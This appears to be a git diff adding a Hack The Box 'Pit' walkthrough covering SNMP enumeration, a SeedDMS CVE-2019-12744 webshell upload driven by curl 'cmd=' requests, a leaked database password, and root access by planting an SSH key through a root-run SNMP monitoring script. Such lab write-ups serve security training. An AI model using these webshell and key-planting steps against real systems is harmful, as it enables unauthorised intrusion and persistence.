@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/pit.png
-tags: ["HTB"]
+tags: ["HTB", "udp", "snmp", "feroxbuster", "snmpwalk", "seeddms", "cve-2019-12744", "exploitdb", "webshell", "upload", "selinux", "cockpit", "getfacl", "facl"]
 ---
 
 # Pit
@@ -247,3 +247,210 @@ Nmap done: 1 IP address (1 host up) scanned in 78.83 seconds
 ```
 └─$ snmpwalk -v1 -c public 10.10.10.241 . > snmpwalk
 ```
+```
+<SNIP>
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."memory" = INTEGER: 3
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."monitoring" = INTEGER: 27
+NET-SNMP-EXTEND-MIB::nsExtendResult."memory" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendResult."monitoring" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".1 = STRING:               total        used        free      shared  buff/cache   available
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".2 = STRING: Mem:        4023500      299404     3443512        8764      280584     3487528
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".3 = STRING: Swap:       1961980           0     1961980
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".1 = STRING: Database status
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".2 = STRING: OK - Connection to database successful.
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".3 = STRING: System release info
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".4 = STRING: CentOS Linux release 8.3.2011
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".5 = STRING: SELinux Settings
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".6 = STRING: user
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".7 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".8 = STRING:                 Labeling   MLS/       MLS/                          
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".11 = STRING: guest_u         user       s0         s0                             guest_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".12 = STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".13 = STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".14 = STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".15 = STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".16 = STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".17 = STRING: user_u          user       s0         s0                             user_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".18 = STRING: xguest_u        user       s0         s0                             xguest_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".19 = STRING: login
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".20 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".21 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".22 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".23 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".24 = STRING: michelle             user_u               s0                   *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".25 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: System uptime
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = STRING:  16:32:31 up  1:42,  0 users,  load average: 0.08, 0.02, 0.01
+
+```
+- We have an interesting `seeddms` inside `/var/www/html`
+```
+<SNIP>
+UCD-SNMP-MIB::dskPath.1 = STRING: /
+UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms
+UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root
+UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms
+<SNIP>
+```
+
+- http://dms-pit.htb/seeddms51x/seeddms/
+
+![](./images/3.png)
+
+## Foothold/User
+- Combination of `michelle:michelle` creds work
+
+![](./images/4.png)
+
+- If we open `Upgrade Note`, we can download `Changelog`
+  - It indicates that `SeedDMS` is version `5.1.15`
+  - We only have `CVE-2019-12744`
+    - Which is fixed by [.htaccess](https://httpd.apache.org/docs/2.4/howto/htaccess.html)
+    - But `Nginx` does not use `.htaccess` files as `Apache` does.
+    - And we do have http://dms-pit.htb/seeddms51x/data/.htaccess file
+  - So we could potentially exploit it via `CVE-2019-12744`
+  - We just need to find a way to upload files
+
+![](./images/5.png)
+
+![](./images/6.png)
+
+- Upload a `shell.php`
+
+![](./images/7.png)
+
+- Check the `id` of the document and visit
+  - `http://dms-pit.htb/seeddms51x/data/1048576/<ID>/1.php?cmd=id`
+```
+└─$ curl http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=id
+uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
+
+```
+
+- Unfortunately, we can't spawn a reverse shell
+  - So we have to enumerate the box this way
+  - We have a `settings.xml` in web directory
+```
+└─$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php --data-urlencode 'cmd=pwd'
+/var/www/html/seeddms51x/data/1048576/31
+```
+```
+└─$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php --data-urlencode 'cmd=ls ../../../'
+conf
+data
+pear
+seeddms
+www
+```
+```
+└─$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php --data-urlencode 'cmd=ls ../../../conf/'
+settings.xml
+settings.xml.template
+stopwords.txt
+```
+
+- We have creds
+```
+<SNIP>
+    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
+    </database>
+    <!-- smtpServer: SMTP Server hostname
+       - smtpPort: SMTP Server port
+       - smtpSendFrom: Send from
+    -->    
+<SNIP>
+```
+
+- Unfortunately we can't `ssh`
+  - But we can login to service on port `9090`
+
+![](./images/8.png)
+
+- There's a terminal window we can access
+
+![](./images/9.png)
+
+## Root
+- as `michelle` I can only list only `michelle`'s processes
+```
+[michelle@pit /]$ ps auxww
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.3 245492 14244 ?        Ss   Nov04   0:15 /usr/lib/systemd/systemd --switched-root --system --deserialize 17
+michelle   11362  0.0  0.0  27404   520 ?        Ss   08:02   0:00 /usr/bin/ssh-agent
+michelle   11365  0.0  0.2  94020  9820 ?        Ss   08:02   0:00 /usr/lib/systemd/systemd --user
+michelle   11369  0.0  0.1 314760  5152 ?        S    08:02   0:00 (sd-pam)
+michelle   11375  0.2  0.6 494604 27104 ?        Rl   08:02   0:03 cockpit-bridge
+michelle   11563  0.0  0.0  24100  3904 pts/0    Ss   08:03   0:00 /bin/bash
+michelle   12799  0.0  0.0  58696  4000 pts/0    R+   08:26   0:00 ps auxww
+```
+
+- But we saw the list of processes via `snmp`
+```
+<SNIP>
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+<SNIP>
+```
+
+- The string indicates we could possibly perform `rce`
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce
+  - https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/
+- The file itself can be executed as `root`
+  - And it's a shell script
+```
+[michelle@pit /]$ ls -lha /usr/bin/monitor
+-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
+```
+```
+[michelle@pit /]$ file /usr/bin/monitor
+/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
+```
+```
+#!/bin/bash
+
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+```
+
+- Let's check `/usr/local/monitoring`
+  - It has `+` at the of the permissions
+  - `getfacl` shows that `michelle` can write and execute from the directory
+```
+[michelle@pit /]$ ls -lhd /usr/local/monitoring
+drwxrwx---+ 2 root root 101 Nov  5 08:30 /usr/local/monitoring
+```
+```
+[michelle@pit /]$ getfacl /usr/local/monitoring/
+getfacl: Removing leading '/' from absolute path names
+# file: usr/local/monitoring/
+# owner: root
+# group: root
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+```
+
+- I'll create a script which will write my `ssh` key to `root`'s `authorized_keys`
+  - And spawn it from `snmp`
+  - The output looks good
+  - And now we can get our flag 
+```
+[michelle@pit monitoring]$ echo 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo<SNIP> kali@kali" >> /root/.ssh/authorized_keys' > check_key.sh
+```
+```
+└─$ snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
+NET-SNMP-EXTEND-MIB::nsExtendCommand."memory" = STRING: /usr/bin/free
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+NET-SNMP-EXTEND-MIB::nsExtendArgs."memory" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."memory" = STRING: 
+<SNIP>
+```
+
+![](./images/10.png)
